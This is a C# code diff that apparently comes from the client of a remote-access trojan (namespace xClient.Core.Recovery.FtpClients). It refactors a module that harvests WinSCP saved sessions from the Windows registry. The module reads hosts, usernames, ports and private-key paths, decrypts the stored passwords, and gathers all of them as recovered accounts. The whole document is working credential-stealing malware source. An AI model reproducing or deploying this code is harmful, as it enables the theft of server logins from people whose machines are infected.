@@ -2,8 +2,8 @@
 using System;
 using System.Collections.Generic;
 using System.Linq;
-using System.Text;
 using xClient.Core.Data;
+using xClient.Core.Extensions;
 
 namespace xClient.Core.Recovery.FtpClients
 {
@@ -15,30 +15,30 @@ namespace xClient.Core.Recovery.FtpClients
             try
             {
                 string RegKey = @"SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions";
-                using (Microsoft.Win32.RegistryKey key = Registry.CurrentUser.OpenSubKey(RegKey))
+
+                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(RegKey))
                 {
                     foreach (String subkeyName in key.GetSubKeyNames())
                     {
-                        if (Registry.GetValue(key.OpenSubKey(subkeyName).ToString(), "HostName", null) != null)
+                        using (RegistryKey accountKey = key.OpenReadonlySubKeySafe(subkeyName))
                         {
-                            string Host = Registry.GetValue(key.OpenSubKey(subkeyName).ToString(), "HostName", "").ToString();
-                            string User = Registry.GetValue(key.OpenSubKey(subkeyName).ToString(), "UserName", "").ToString();
-                            string Password = WinSCPDecrypt(User, Registry.GetValue(key.OpenSubKey(subkeyName).ToString(), "Password", "").ToString(), Host);
-                            if ((Password == string.Empty) && ((Registry.GetValue(key.OpenSubKey(subkeyName).ToString(), "PublicKeyFile", null) != null)))
-                                Password = "[PRIVATE KEY AT " + Uri.UnescapeDataString(Registry.GetValue(key.OpenSubKey(subkeyName).ToString(), "PublicKeyFile", null).ToString()) + "]";
-                            if (Registry.GetValue(key.OpenSubKey(subkeyName).ToString(), "PortNumber", null) != null)
-                            {
-                                Host = Host + ":" + Registry.GetValue(key.OpenSubKey(subkeyName).ToString(), "PortNumber", null);
-                            }
-                            else
-                            {
-                                Host = Host + ":22";
-                            }
+                            if (accountKey == null) continue;
+                            string host = accountKey.GetValueSafe("HostName");
+                            if (string.IsNullOrEmpty(host)) continue;
+
+                            string user = accountKey.GetValueSafe("UserName");
+                            string password = WinSCPDecrypt(user, accountKey.GetValueSafe("Password"), host);
+                            string privateKeyFile = accountKey.GetValueSafe("PublicKeyFile");
+                            host += ":" + accountKey.GetValueSafe("PortNumber", "22");
+
+                            if (string.IsNullOrEmpty(password) && !string.IsNullOrEmpty(privateKeyFile))
+                                password = string.Format("[PRIVATE KEY LOCATION: \"{0}\"]", Uri.UnescapeDataString(privateKeyFile));
+
                             data.Add(new RecoveredAccount
                             {
-                                URL = Host,
-                                Username = User,
-                                Password = Password,
+                                URL = host,
+                                Username = user,
+                                Password = password,
                                 Application = "WinSCP"
                             });
                         }
@@ -68,59 +68,55 @@ namespace xClient.Core.Recovery.FtpClients
                     return "";
                 }
                 string qq = pass;
-                List<string> HashList = new List<string>();
-                foreach (char keyf in qq)
-                    HashList.Add(keyf.ToString());
-                List<string> NewHashList = new List<string>();
-                for (int i = 0; i < HashList.Count; i++)
+                List<string> hashList = qq.Select(keyf => keyf.ToString()).ToList();
+                List<string> newHashList = new List<string>();
+                for (int i = 0; i < hashList.Count; i++)
                 {
-                    if (HashList[i] == "A")
-                        NewHashList.Add("10");
-                    if (HashList[i] == "B")
-                        NewHashList.Add("11");
-                    if (HashList[i] == "C")
-                        NewHashList.Add("12");
-                    if (HashList[i] == "D")
-                        NewHashList.Add("13");
-                    if (HashList[i] == "E")
-                        NewHashList.Add("14");
-                    if (HashList[i] == "F")
-                        NewHashList.Add("15");
-                    if ("ABCDEF".IndexOf(HashList[i]) == -1)
-                        NewHashList.Add(HashList[i]);
+                    if (hashList[i] == "A")
+                        newHashList.Add("10");
+                    if (hashList[i] == "B")
+                        newHashList.Add("11");
+                    if (hashList[i] == "C")
+                        newHashList.Add("12");
+                    if (hashList[i] == "D")
+                        newHashList.Add("13");
+                    if (hashList[i] == "E")
+                        newHashList.Add("14");
+                    if (hashList[i] == "F")
+                        newHashList.Add("15");
+                    if ("ABCDEF".IndexOf(hashList[i]) == -1)
+                        newHashList.Add(hashList[i]);
                 }
-                List<string> NewHashList2 = NewHashList;
+                List<string> newHashList2 = newHashList;
                 int length = 0;
-                if (dec_next_char(NewHashList2) == 255)
-                    length = dec_next_char(NewHashList2);
-                NewHashList2.Remove(NewHashList2[0]);
-                NewHashList2.Remove(NewHashList2[0]);
-                NewHashList2.Remove(NewHashList2[0]);
-                NewHashList2.Remove(NewHashList2[0]);
-                length = dec_next_char(NewHashList2);
-                List<string> NewHashList3 = NewHashList2;
-                NewHashList3.Remove(NewHashList3[0]);
-                NewHashList3.Remove(NewHashList3[0]);
-                int todel = dec_next_char(NewHashList2) * 2;
+                if (dec_next_char(newHashList2) == 255)
+                    length = dec_next_char(newHashList2);
+                newHashList2.Remove(newHashList2[0]);
+                newHashList2.Remove(newHashList2[0]);
+                newHashList2.Remove(newHashList2[0]);
+                newHashList2.Remove(newHashList2[0]);
+                length = dec_next_char(newHashList2);
+                List<string> newHashList3 = newHashList2;
+                newHashList3.Remove(newHashList3[0]);
+                newHashList3.Remove(newHashList3[0]);
+                int todel = dec_next_char(newHashList2) * 2;
                 for (int i = 0; i < todel; i++)
                 {
-                    NewHashList2.Remove(NewHashList2[0]);
+                    newHashList2.Remove(newHashList2[0]);
                 }
                 string password = "";
                 for (int i = -1; i < length; i++)
                 {
-                    string data = ((char)dec_next_char(NewHashList2)).ToString();
-                    NewHashList2.Remove(NewHashList2[0]);
-                    NewHashList2.Remove(NewHashList2[0]);
+                    string data = ((char)dec_next_char(newHashList2)).ToString();
+                    newHashList2.Remove(newHashList2[0]);
+                    newHashList2.Remove(newHashList2[0]);
                     password = password + data;
                 }
                 string splitdata = user + host;
-                int len = password.Length - 1;
-                int sp = password.IndexOf(splitdata);
+                int sp = password.IndexOf(splitdata, StringComparison.Ordinal);
                 password = password.Remove(0, sp);
                 password = password.Replace(splitdata, "");
                 return password;
-
             }
             catch
             {
